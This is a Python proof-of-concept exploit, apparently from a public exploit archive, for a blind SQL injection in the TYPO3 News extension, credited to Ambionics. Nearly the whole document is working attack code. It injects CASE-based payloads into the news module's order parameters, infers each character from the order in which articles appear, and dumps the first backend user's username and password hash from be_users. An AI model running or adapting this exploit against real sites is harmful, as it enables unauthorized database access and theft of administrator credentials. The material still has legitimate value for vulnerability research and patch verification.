# Vendor Homepage: https://typo3.org/extensions/repository/view/news
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/typo3-news-module-sqli
 
 
#!/usr/bin/python3
 
# TYPO3 News Module SQL Injection Exploit
# https://www.ambionics.io/blog/typo3-news-module-sqli
# cf
#
# The injection algorithm is not optimized, this is just meant to be a POC.
#
 
import requests
import string
 
  
session = requests.Session()
session.proxies = {&#039;http&#039;: &#039;localhost:8080&#039;}
 
 
# Change this
URL = &#039;http://vmweb/typo3/index.php?id=8&no_cache=1&#039;
PATTERN0 = &#039;Article #1&#039;
PATTERN1 = &#039;Article #2&#039;
 
FULL_CHARSET = string.ascii_letters + string.digits + &#039;$./&#039;
 
 
def blind(field, table, condition, charset):
 
    # We add 9 so that the result has two digits
 
    # If the length is superior to 100-9 it won&#039;t work
 
    size = blind_size(
 
        &#039;length(%s)+9&#039; % field, table, condition,
 
        2, string.digits
 
    )
 
    size = int(size) - 9
 
    data = blind_size(
 
        field, table, condition,
 
        size, charset
 
    )
 
    return data
 
 
def select_position(field, table, condition, position, char):
 
    payload = &#039;select(%s)from(%s)where(%s)&#039; % (
 
        field, table, condition
 
    )
 
    payload = &#039;ord(substring((%s)from(%d)for(1)))&#039; % (payload, position)
 
    payload = &#039;uid*(case((%s)=%d)when(1)then(1)else(-1)end)&#039; % (
 
        payload, ord(char)
 
    )
 
    return payload
 
 
def blind_size(field, table, condition, size, charset):
 
    string = &#039;&#039;
 
    for position in range(size):
 
        for char in charset:
 
            payload = select_position(field, table, condition, position+1, char)
 
            if test(payload):
 
                string += char
 
                print(string)
 
                break
 
        else:
 
            raise ValueError(&#039;Char was not found&#039;)
 
  
 
    return string
 
 
def test(payload):
 
    response = session.post(
 
        URL,
 
        data=data(payload)
 
    )
 
    response = response.text
 
    return response.index(PATTERN0) < response.index(PATTERN1)
 
def data(payload):
 
    return {
 
        &#039;tx_news_pi1[overwriteDemand][order]&#039;: payload,
 
        &#039;tx_news_pi1[overwriteDemand][OrderByAllowed]&#039;: payload,
 
        &#039;tx_news_pi1[search][subject]&#039;: &#039;&#039;,
 
        &#039;tx_news_pi1[search][minimumDate]&#039;: &#039;2016-01-01&#039;,
 
        &#039;tx_news_pi1[search][maximumDate]&#039;: &#039;2016-12-31&#039;,
 
    }
 
# Exploit
 
print("USERNAME:", blind(&#039;username&#039;, &#039;be_users&#039;, &#039;uid=1&#039;, string.ascii_letters))
print("PASSWORD:", blind(&#039;password&#039;, &#039;be_users&#039;, &#039;uid=1&#039;, FULL_CHARSET))

